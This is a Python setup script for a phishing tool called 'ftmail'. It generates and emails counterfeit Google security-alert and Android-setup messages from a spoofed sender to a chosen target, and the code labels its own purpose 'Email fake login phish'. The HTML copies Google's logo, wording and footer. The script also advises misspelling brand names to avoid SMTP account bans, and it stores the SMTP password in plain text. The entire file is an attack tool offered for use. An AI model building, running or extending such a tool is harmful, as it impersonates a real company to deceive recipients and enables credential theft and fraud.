#!/bin/env python3
#!/bin/env bash

import os
import random
import time

def setup():
  os.system("clear")
  os.system("sudo pip install argparse")
  os.system("clear")
  print("***Welcome to ftmail tool. Let\'s initiate our setup (You only need to do this once). Only smtp mailing available.\n\nBrevo is recomended. Link for Brevo => https://login.brevo.com\n")
  smtp_email = input("Enter your smtp user email: ")
  smtp_pass = input("Enter your smtp password: ")
  smtp_server = input("Enter your smtp server name (eg. smtp.relay.example.com): ")
  smtp_port = input("Enter your smtp port: ")
  server_port = smtp_server+":"+smtp_port
  ra_vc = random.randint(1000, 9999)
  va_e = (f"""<div style="background-color: black; color:springgreen;padding: 10px; margin:0"><h2>Hello Hacker,</h2><h5>Thanks for using FTMail. Your verification code is: <br></h5><p style="text-align: center; font-size: 1.8rem;">{ra_vc}</p><p style="text-align: right">Best Regards,</p><p style="text-align: right">DistructivE LotuS</p></div> """)
  print("\nVarifying your credentials. If you don\'t get any mail within a minute, then you have to resolve your credentials & then run it again\n")
  ad_subj = "FTMail Varification"
  ad_fr_em = "Distructive Lotus <donotreply@distructivelotus.com>"
  os.system(f"sendemail -f '{ad_fr_em}' -t '{smtp_email}' -u '{ad_subj}' -m '{va_e}' -s '{server_port}' -xu '{smtp_email}' -xp '{smtp_pass}' -o tls=no")
  time.sleep(4)
  authenticated = False
  while(True):
    va_ic = int(input("Enter your varification code: "))
    if(va_ic == ra_vc):
      print("Authentication success !")
      authenticated = True
      break
    else:
      print("Authentication failure !")
      continue
  if(authenticated):
    main_c1_imp = """#!/bin/env python3
import argparse
import os

"""
    main_c2_apis = (f"""smtp_server = '{smtp_server}'
smtp_port = '{smtp_port}'
smtp_email = '{smtp_email}'
smtp_pass = '{smtp_pass}'

""")
    main_c3_rem = '''def sendemail(smtp_server, smtp_port, body, subject):
        print("\\n***Warning: Using 'Google', 'Facebook' and others social media's name your SMTP account might get baned ! Instead, you can use 'Google.com, Góoglé, Google., Google!' etc\\n")
        name_f = input("Fake name: ")
        email_f = input("Fake email: ")
        email_r = input("Send email to: ")
        name_f_email = name_f+" <"+email_f+">"
        server_port = smtp_server+":"+smtp_port
        os.system(f"sendemail -f '{name_f_email}' -t '{email_r}' -u '{subject}' -m '$(cat {body})' -s '{server_port}' -xu '{smtp_email}' -xp '{smtp_pass}' -o tls=no")



tp = 'r'
while(tp=='r'):
        print("*****Email template list*****")
        print("1) Sign-in security alert")
        print("2) Seting up android alert")
        print("\'q\' to terminate the program")
        tn = input("Choose a template: ")
        if tn=='q': tp=tn
        parser = argparse.ArgumentParser(description="Email fake login phish")
        parser.add_argument('--email', help="The email address you wanna target", required=True)
        parser.add_argument('--device', help="Device name you wanna fakely access with", required=True)
        parser.add_argument('--logo', help="Choose a letter to be the logo", required=True)
        parser.add_argument('--logobg', help="Choose logo background color")
        parser.add_argument('-o', help="Output file")
        parser.add_argument('--user', help="Enter the target username")
        opts = parser.parse_args()

        logobg = opts.logobg if bool(opts.logobg) else "darkgreen"
        outf = opts.o if bool(opts.o) else "fake-sign-in.html"
        user = opts.user if bool(opts.user) else "User"

        por1 = """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">  <meta http-equiv="X-UA-Compatible" content="ie=edge">  <style>    *{      margin: 0;      padding: 0;      background-color: #202125;      font-family: sans-serif;    }    .container{      height: 500px;      width: 320px;      border: 0.01px solid grey;      border-radius: 5px;      margin: 60px auto 0px auto;    }    .container img{      height: 25px;      margin-top: 60px;      margin-left: 120px;      margin-bottom: 25px;    }    .si{      font-size: 1.5rem;      color: white;      text-align: center;    }    .acclogo{      color: white;      display: inline;      font-size: 0.7rem;      padding: 5px 8px;      border-radius: 100%;    }    .em{      display: inline; text-decoration: none;      color: whitesmoke;      font-size: 0.8rem;    }    .acc{      text-align: center;    }    .wr{      color: whitesmoke;      opacity: 0.8;      text-align: center;      font-size: 0.85rem;      margin: 0px 20px;      line-height: 20px;    }    .ca{      color: whitesmoke;      background-color: dodgerblue;      font-size: 0.9rem;      text-decoration: none;      padding: 10px 20px;      border-radius: 5px;      margin-left: 95px;    }    .ss{      color: grey;      font-size: 0.8rem;      text-align: center;      margin-top: 30px;      margin-bottom: 5px;    }    .cli{      text-decoration: none;      color: whitesmoke;      font-size: 0.85rem;      display: block;      text-align: center;      opacity: 0.8;    }    .add{      color: grey;      font-size: 0.8rem;      text-align: center;      margin-top: 20px;      margin-left: 15px;      margin-right: 15px;      line-height: 20px;-      opacity: 0.8px;    }  </style></head><body>  <div class="container">    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">"""
        por2 = (f"""<p class="si">A new sign-in on {opts.device}</p> <br>    <div class="acc">      <p class="acclogo" style="background-color: {logobg};">{opts.logo}</p>      <p class="em">{opts.email}</p>    </div> <br>    <hr align="center", size="0.1" width="280" color="grey" style="opacity: 0.2; margin-left: 18px">    <br>    <p class="wr">We noticed a new sign-in to your google account on {opts.device} device. If this was you, you dont need to do anything, If not, we'll help secure your account</p><br> <br>    <a href="https://accounts.google.com/AccountChooser?Email={opts.email}&continue=https://myaccount.google.com/alert/nt/1735781663520?rfn%3D364%26rfnc%3D1%26eid%3D-7079935564156740159%26et%3D0" class="ca">Check activity</a>    <p class="ss">You can see security activity at</p>    <a class="cli" href="https://myaccount.google.com/notifications">https://myaccount.google.com/notifications</a>  </div>  <p class="add">    You received this email to let you know about important changes to your Google Account and services.© 2024 Google LLC, 1600 Amphitheatre Parkway, Mountain View, CA 94043, USA  </p></body></html>""")
        mainp = por1 + por2

        por3 = """<!Doctype html><html lang="en"><head>    <meta charset="UTF-8">    <meata name="viewport" content="width=device-width, initial-scale=1.0">    <meta http-equiv="X-UA-Compatible" content="ie=edge">    <style>      body{  margin: 0;  padding: 0;  background-color: #202125;  font-family: Sans-Serif;}.mainbody{  width: 320px;  height: 740px;  background-color: black;  margin: 25px auto;}.maininfo{  height: 480px;  background-color: black;  border: 0.1px solid grey;  border-radius: 8px;} .mainbody .mt{  margin: 20px 0 0 0;  color: white;  font-size: 1.9rem;  text-align: center;  line-height: 40px;  opacity: 0.95;}.ot{  color: white;  font-size: 1.2rem;  text-align: center;  line-height: 28px;  opacity: 0.95;  margin-bottom: 40px;}.maininfo .gsb{  color: white;  text-align: center;  text-decoration: none;  background-color: dodgerblue;  padding: 10px 20px;  border-radius: 5px;margin-left: 100px;  border: 1px solid #6DB7FF;}img{  height: 25px;  margin-top: 40px;  margin-left: 120px;  margin-bottom: 25px;  color: White;}.foot{  color: white;  opacity: 0.65;  font-size: 0.85rem;  text-align: center;  margin: 20px 10px 0 10px;  line-height: 20px;}.foot .m{  text-decoration: none;  color: white; opacity: 0.65;}.foot a{  color: white;  opacity: 0.65;}    </style>  </head>  <body>    <div class="mainbody">     <div class="maininfo">        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">"""
        por4 = (f"""<p class="mt">Hi {user},<br> A better Android experience is <br> waiting</p>        <p class="ot">Take one minute to set up <br>your {opts.device}  with <br>Google</p>        <a class="gsb" href="https://notifications.google.com/g/p/ANiao5qcJIlgF02rdYISTdeRz4w_2hy9gCrivimyQFU2wCE-QEVR9gy4rQxdWGCnO2el5UnpkBoBB7b6aljzJnQCObfz0dVtw1TFA9ehG0pswTJe0ovuNLK53VA5ojLUkqq433971FkM-i4vYMKb_osgiIXB_6SqgswslPXuVL6_Szy3M-KhQHh097_CZW5KBapLFFKvmuAPjXhcuCFEhznu93E7bP0lD0cwPofmUHrIv3GuF4T7soXBDOuClFnizbVRHO_eqlq_H1j1d6RBA2fB3GDAYAJBhFHUTq5LCtrqF094LgnHhiXh_f3V65f9PwOCOMk00S0Ei1Yo7BDs_DJL225P9e5Y4WRpQl1Hnv2YJpGWlRrr6Qigj_N6kg67wK9PGHRN0jbi2l-IKA6dgHpdh_386G29nnE6HrsuDoJPG2BXUcq_zDC6a5CHoi9KDfGcF3xc6IQr6S41lFKHdexXyWKGFaIyeQp93L6gfqS058M5kr615vJz_4XfAJ039_khnVHGT2VIlBzjMXg8HbNVy8KYh3mFWVpqzX95qqW3qMNbBL1RMOkty_HnRHNvBaag-ZFgsY8D-Bu2DBc-XcjCzdcA-vqRwxQdUH_-9T_CCmJdy1E-9n-5PGXzwBHWHOAGcKW9Zq85XRTW1ma8pAeGm3cFrq5dSxS8vpqzccSETLRWCvv7SblbNKwg4YmxWfkxOQWQdtsUYgd3qQVwYehHgiEF8dbNVWX5YCFANFNh5oA8rA">Get started</a>      </div>      <p class="foot">This email was sent to <br> <a class="m" href="maiito:{opts.email}">{opts.email}</a> because you recently signed into your Google Account on your {opts.device}  device. If you do not wish to receive emails to help you set up your device with Google when you sign into your account on the device for the first time, please <a href="https://notifications.google.com/g/p/ANiao5qlINUsZz9peQIGjCaDyPUK5vfjBQ7S2adxYcAa-iE1nanyhfFMlUtekZni0y-45aXmU2QsEagIA0xf5uqUA7Aif1ULbCi-X-JaS-ixiXoIFU-RyeOyObF748JetgqoKkmA092kgMFySpsCLXI5-d9al_8il7acm4pv9rfQX1BbRyVw-K4l2JvtqWqZQhRE8Vm1N1r6UFYCMbpPrfqIy_su-hfyrKswEVAqmopTqgvr8wqACOnFMl-zj4ZofnbML2hobryV26RJnKYepy_606-Jf4Q0wNxULnAZOIHHc_xvGRdsc_RmRYJGcbcqjWvHPrF0Eov3bbvXsu4nHPIcMtq-7dRINP-K2b1H-I1xFflU7iQwz3eu8KTnplumYrZfCpe_CAYjz1nuUo-OAjpbYU2iwEUUp23n0zdqklm1i3NBcZIlAjmumVBpTmTJF4RYs7tu-qzr7dhrBZuh7Y7g3fcMtYEvu0u4pxksGRtnNgCQZuj1n4nCY60CJPqwF_eyC8bwjxoZNCv-Pr135_gQFfTIRg9orLGAxdSedSKaUsSrhCcrLdf6IIY3pL5AcQTBkC2iKkYYo6rmpJvQjdEth-81sRt5QgNJfEyKj2PNWKp4edkkLq1EX2qAyoPOBHQCa2AV9tzldKHd7hQUjVzJRy50HeBn4p9-FV8FEH04xxmPTNz4l9p9nxwxCkCOQqb3pU_9a6e5T4iCYoV4WPhEyLE">unsubscribe.</a><br><br>© 2024 Google LLC 1600 Amphitheatre Parkway, Mountain View, CA 94043</p>    </div>  </body></html>""")
        mainp1 = por3 + por4

        if tn=='1':
                ht_file = open(outf, 'w')
                if ht_file.write(mainp): print(f"\\n[SUCCESS|file]: {outf} saved in current directory !\\n")
                ht_file.close()
                while True:
                  r_is = input("Do you wanna Mail this file to user ?[y/n]: ")
                  if r_is=='y':
                          subject = 0
                          if tn=='1':
                                  subject = "Security alert"
                          elif tn=='2':
                                  subject = (f"✅ {user}, finish setting up {opts.device} device with Google")
                          sendemail(smtp_server, smtp_port, outf, subject)
                          tp='q'
                          break
                  elif r_is=='n':
                        tp='q'
                        break
                  else:
                        print("Invalid input !")
                        continue

        elif tn=='2':
                ht_file = open(outf, 'w')
                if ht_file.write(mainp1): print(f"\\n[SUCCESS|file]: {outf} saved in current directory ! \\n")
                ht_file.close()
        elif tn=='q': print("\\nThanks for using this tool. Exiting...\\n")
        else:
                print("\\nNot Available\\n")
                continue'''
    final_f = main_c1_imp + main_c2_apis + main_c3_rem
    final_touch = open("ftmail-1.0.0.py", 'w')
    final_touch.write(final_f)
    final_touch.close()
    

print("Installing Dependencies ...\n\n")
opsys = os.system("lsb_release -i | cut -d ':' -f 2 | xargs")
if(os.system("command -v sendemail") == 0):
  setup()
else:
  if(opsys == "Kali" or opsys == "Ubuntu" or opsys == "Debian"):
    os.system("sudo apt-get update && sudo apt-get install sendemail")
    setup()
  elif(opsys == "Arch"):
    os.system("sudo pacman -S sendemail")
    setup()
  elif(opsys == "Fedora"):
    os.system("sudo yum install epel-release")
    setup()
  elif(opsys == "CentOS"):
    os.system("sudo yum install epel-release && sudo yum install sendemail")
    setup()
  else:
    print(f" Your linux distrubution name is {opsys}. Unfortunately our developer did\'nt implement any resource to install required package in {opsys}. We are sorry, this bug will be fixed in a while. \n\n***For now, you have to install sendemail package manually in your terminal and have to run this program again !\n Exiting ...")
  
  

